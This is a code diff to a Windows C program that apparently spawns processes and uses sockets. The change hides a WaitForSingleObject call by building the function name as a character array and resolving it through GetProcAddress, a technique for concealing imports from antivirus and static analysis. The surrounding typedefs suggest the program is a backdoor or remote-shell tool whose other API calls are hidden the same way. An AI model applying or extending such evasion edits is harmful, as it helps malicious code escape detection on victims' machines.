@@ -20,6 +20,7 @@ typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
 typedef UINT _GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
 typedef DWORD _GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
 typedef BOOL _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+typedef DWORD _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
 
 #define SOCKET_BUFFER_SIZE 256
 #define SPLIT_STRING_ARRAY_SIZE 16
@@ -320,7 +321,9 @@ WinMain(HINSTANCE hInstance,
 				OutputDebugStringA(bufferError);
 			}
 
-			WaitForSingleObject( pi.hProcess, INFINITE );
+			char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
+			_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(libraryKernel32, ca_WaitForSingleObject);
+			f_WaitForSingleObject( pi.hProcess, INFINITE );
 
 			CloseHandle(pi.hProcess);
 			CloseHandle(pi.hThread);
